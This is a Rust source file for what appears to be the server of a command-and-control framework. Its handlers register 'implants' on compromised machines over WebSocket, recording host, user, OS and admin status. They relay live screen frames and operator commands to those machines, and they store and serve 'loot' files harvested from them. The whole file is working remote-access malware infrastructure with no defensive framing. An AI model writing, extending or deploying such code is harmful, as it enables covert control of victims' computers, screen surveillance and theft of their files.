use std::collections::HashMap;
use std::path::{Path as StdPath, PathBuf};

use axum::body::Body;
use axum::extract::ws::{Message, WebSocket, WebSocketUpgrade};
use axum::extract::{Path, Query, State};
use axum::http::header;
use axum::http::{HeaderMap, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::Json;
use futures_util::{SinkExt, StreamExt};
use serde::Serialize;
use tokio::sync::{broadcast, mpsc};
use tracing::{info, warn};

use crate::state::{now, AppState, Session, SessionInfo, Wire};

/// GET /api/sessions — list live (and recently dead) implants.
pub async fn sessions(
    State(st): State<AppState>,
    headers: HeaderMap,
    Query(q): Query<HashMap<String, String>>,
) -> Response {
    if !st.authorized(&headers, &q) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let mut out: Vec<SessionInfo> = {
        let map = st.sessions.read().await;
        map.values().map(|s| s.info.clone()).collect()
    };
    out.sort_by(|a, b| a.host.cmp(&b.host));
    // Prune implants offline for over an hour.
    let t = now();
    {
        let mut map = st.sessions.write().await;
        map.retain(|_, s| s.info.online || t.saturating_sub(s.info.last_seen) < 3600);
    }
    Json(out).into_response()
}

/// WS /ws/implant — one long-lived socket per implant.
pub async fn implant_ws(
    ws: WebSocketUpgrade,
    State(st): State<AppState>,
    headers: HeaderMap,
    Query(q): Query<HashMap<String, String>>,
) -> Response {
    if !st.authorized(&headers, &q) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    ws.on_upgrade(move |socket| handle_implant(socket, st))
}

async fn handle_implant(socket: WebSocket, st: AppState) {
    let (to_implant_tx, mut to_implant_rx) = mpsc::channel::<Wire>(64);
    let (mut sink, mut stream) = socket.split();

    // Single writer task owns the sink; everything else fans in via the channel.
    let writer = tokio::spawn(async move {
        while let Some(w) = to_implant_rx.recv().await {
            if sink.send(w.to_message()).await.is_err() {
                break;
            }
        }
    });

    let mut session_id: Option<String> = None;
    let mut bcast: Option<broadcast::Sender<Wire>> = None;

    while let Some(msg) = stream.next().await {
        let msg = match msg {
            Ok(m) => m,
            Err(e) => {
                warn!("implant socket error: {e}");
                break;
            }
        };
        match msg {
            Message::Text(t) => {
                let v: serde_json::Value = match serde_json::from_str(&t) {
                    Ok(v) => v,
                    Err(_) => continue,
                };
                let kind = v.get("t").and_then(|x| x.as_str()).unwrap_or("");
                if session_id.is_none() && kind == "hello" {
                    let id = v
                        .get("id")
                        .and_then(|x| x.as_str())
                        .unwrap_or("")
                        .to_string();
                    if id.is_empty() || id.len() > 64 {
                        continue;
                    }
                    let screen = v
                        .get("screen")
                        .and_then(|s| s.as_array())
                        .map(|a| {
                            [
                                a.first().and_then(|x| x.as_u64()).unwrap_or(0) as u32,
                                a.get(1).and_then(|x| x.as_u64()).unwrap_or(0) as u32,
                            ]
                        })
                        .unwrap_or([0, 0]);
                    let info = SessionInfo {
                        id: id.clone(),
                        host: strf(&v, "host"),
                        user: strf(&v, "user"),
                        os: strf(&v, "os"),
                        arch: strf(&v, "arch"),
                        admin: v.get("admin").and_then(|x| x.as_bool()).unwrap_or(false),
                        screen,
                        last_seen: now(),
                        online: true,
                    };
                    let (btx, _) = broadcast::channel::<Wire>(256);
                    {
                        let mut map = st.sessions.write().await;
                        map.insert(
                            id.clone(),
                            Session {
                                to_implant: to_implant_tx.clone(),
                                from_implant: btx.clone(),
                                info,
                            },
                        );
                    }
                    info!("implant connected: {id}");
                    session_id = Some(id);
                    bcast = Some(btx);
                    continue; // hello itself is only for registration
                }
                // Everything else (pong / cmd_result / stats) goes to operators.
                if let (Some(id), Some(b)) = (&session_id, &bcast) {
                    {
                        let mut map = st.sessions.write().await;
                        if let Some(s) = map.get_mut(id) {
                            s.info.last_seen = now();
                        }
                    }
                    let _ = b.send(Wire::Text(t));
                }
            }
            Message::Binary(b) => {
                // Loot file (0x03): persist server-side, do not forward to ops.
                if b.first() == Some(&0x03) {
                    if let Some(id) = &session_id {
                        if let Some((name, data)) = parse_loot(&b) {
                            if let Some(rel) = sanitize_rel(&name) {
                                let dir = st.loot_dir.join(safe_component(id));
                                if tokio::fs::create_dir_all(&dir).await.is_ok() {
                                    let path = dir.join(&rel);
                                    if let Some(parent) = path.parent() {
                                        let _ = tokio::fs::create_dir_all(parent).await;
                                    }
                                    if tokio::fs::write(&path, data).await.is_ok() {
                                        info!(
                                            "loot {id}: {} ({} bytes)",
                                            rel.display(),
                                            data.len()
                                        );
                                    }
                                }
                            }
                        }
                        let mut map = st.sessions.write().await;
                        if let Some(s) = map.get_mut(id) {
                            s.info.last_seen = now();
                        }
                        continue;
                    }
                }
                // Screen frame (0x01) — pass through to whoever is attached.
                if let (Some(id), Some(bc)) = (&session_id, &bcast) {
                    {
                        let mut map = st.sessions.write().await;
                        if let Some(s) = map.get_mut(id) {
                            s.info.last_seen = now();
                        }
                    }
                    let _ = bc.send(Wire::Binary(b));
                }
            }
            Message::Close(_) => break,
            _ => {}
        }
    }

    if let Some(id) = session_id {
        let mut map = st.sessions.write().await;
        if let Some(s) = map.get_mut(&id) {
            s.info.online = false;
            s.info.last_seen = now();
        }
        info!("implant disconnected: {id}");
    }
    writer.abort();
}

/// WS /ws/op/:id — operator attaches to one session. Transparent relay.
pub async fn op_ws(
    Path(id): Path<String>,
    ws: WebSocketUpgrade,
    State(st): State<AppState>,
    headers: HeaderMap,
    Query(q): Query<HashMap<String, String>>,
) -> Response {
    if !st.authorized(&headers, &q) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let pair = {
        let map = st.sessions.read().await;
        map.get(&id)
            .map(|s| (s.to_implant.clone(), s.from_implant.subscribe()))
    };
    let (tx, rx) = match pair {
        Some(p) => p,
        None => return StatusCode::NOT_FOUND.into_response(),
    };
    ws.on_upgrade(move |socket| handle_op(socket, tx, rx))
}

async fn handle_op(
    socket: WebSocket,
    to_implant: mpsc::Sender<Wire>,
    mut from_implant: broadcast::Receiver<Wire>,
) {
    let (mut sink, mut stream) = socket.split();
    let writer = tokio::spawn(async move {
        loop {
            match from_implant.recv().await {
                Ok(w) => {
                    if sink.send(w.to_message()).await.is_err() {
                        break;
                    }
                }
                Err(broadcast::error::RecvError::Lagged(_)) => continue,
                Err(broadcast::error::RecvError::Closed) => break,
            }
        }
    });
    while let Some(msg) = stream.next().await {
        let msg = match msg {
            Ok(m) => m,
            Err(_) => break,
        };
        match msg {
            Message::Text(t) => {
                if to_implant.send(Wire::Text(t)).await.is_err() {
                    break;
                }
            }
            Message::Binary(b) => {
                if to_implant.send(Wire::Binary(b)).await.is_err() {
                    break;
                }
            }
            Message::Close(_) => break,
            _ => {}
        }
    }
    writer.abort();
}

fn strf(v: &serde_json::Value, k: &str) -> String {
    v.get(k)
        .and_then(|x| x.as_str())
        .unwrap_or("?")
        .chars()
        .take(128)
        .collect()
}

// ---------------------------------------------------------------------------
// loot store
// ---------------------------------------------------------------------------

#[derive(Serialize)]
struct LootEntry {
    name: String,
    size: u64,
    mtime: u64,
}

/// GET /api/loot/:id — list every file harvested from a session.
pub async fn loot_list(
    Path(id): Path<String>,
    State(st): State<AppState>,
    headers: HeaderMap,
    Query(q): Query<HashMap<String, String>>,
) -> Response {
    if !st.authorized(&headers, &q) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let root = st.loot_dir.join(safe_component(&id));
    let mut items = Vec::new();
    walk_loot(&root, &root, &mut items);
    items.sort_by(|a, b| a.name.cmp(&b.name));
    Json(items).into_response()
}

/// GET /api/loot/:id/*name — download one harvested file.
pub async fn loot_get(
    Path((id, name)): Path<(String, String)>,
    State(st): State<AppState>,
    headers: HeaderMap,
    Query(q): Query<HashMap<String, String>>,
) -> Response {
    if !st.authorized(&headers, &q) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let Some(rel) = sanitize_rel(&name) else {
        return StatusCode::BAD_REQUEST.into_response();
    };
    let path = st.loot_dir.join(safe_component(&id)).join(&rel);
    let Ok(bytes) = tokio::fs::read(&path).await else {
        return StatusCode::NOT_FOUND.into_response();
    };
    let fname = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("loot.bin");
    let ct = content_type(fname);
    let mut resp = Response::new(Body::from(bytes));
    resp.headers_mut()
        .insert(header::CONTENT_TYPE, HeaderValue::from_static(ct));
    let disp = format!("attachment; filename=\"{}\"", fname.replace('"', ""));
    if let Ok(v) = HeaderValue::from_str(&disp) {
        resp.headers_mut().insert(header::CONTENT_DISPOSITION, v);
    }
    resp
}

fn parse_loot(b: &[u8]) -> Option<(String, &[u8])> {
    if b.len() < 3 || b[0] != 0x03 {
        return None;
    }
    let n = u16::from_le_bytes([b[1], b[2]]) as usize;
    if b.len() < 3 + n {
        return None;
    }
    let name = std::str::from_utf8(&b[3..3 + n]).ok()?.to_string();
    Some((name, &b[3 + n..]))
}

/// Turn an implant-supplied relative name into a safe path under the session
/// dir: no traversal, no absolute components, no drive letters, bounded depth.
fn sanitize_rel(name: &str) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    let mut any = false;
    for part in name.replace('\\', "/").split('/') {
        if part.is_empty() || part == "." || part == ".." {
            continue;
        }
        let clean: String = part
            .chars()
            .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ' '))
            .collect();
        let clean = clean.trim_matches(' ').trim_matches('.');
        if clean.is_empty() {
            continue;
        }
        let clean: String = clean.chars().take(120).collect();
        out.push(clean);
        any = true;
        if out.components().count() >= 6 {
            break;
        }
    }
    any.then_some(out)
}

fn safe_component(s: &str) -> String {
    let c: String = s
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .collect();
    if c.is_empty() {
        "unknown".into()
    } else {
        c.chars().take(64).collect()
    }
}

fn walk_loot(dir: &StdPath, root: &StdPath, out: &mut Vec<LootEntry>) {
    let Ok(rd) = std::fs::read_dir(dir) else {
        return;
    };
    for ent in rd.flatten() {
        let p = ent.path();
        let Ok(meta) = ent.metadata() else { continue };
        if meta.is_dir() {
            walk_loot(&p, root, out);
        } else if meta.is_file() {
            let rel = p.strip_prefix(root).unwrap_or(&p);
            let name = rel.to_string_lossy().replace('\\', "/");
            let mtime = meta
                .modified()
                .ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            out.push(LootEntry {
                name,
                size: meta.len(),
                mtime,
            });
        }
        if out.len() >= 5000 {
            return;
        }
    }
}

fn content_type(name: &str) -> &'static str {
    let lower = name.to_ascii_lowercase();
    if lower.ends_with(".json") || lower.ends_with(".txt") || lower.ends_with(".log")
        || lower.ends_with(".csv") || lower.ends_with(".xml") || lower.ends_with(".ini")
        || lower.ends_with(".conf") || lower.ends_with(".yml") || lower.ends_with(".yaml")
        || lower.ends_with(".sql")
    {
        "text/plain; charset=utf-8"
    } else {
        "application/octet-stream"
    }
}
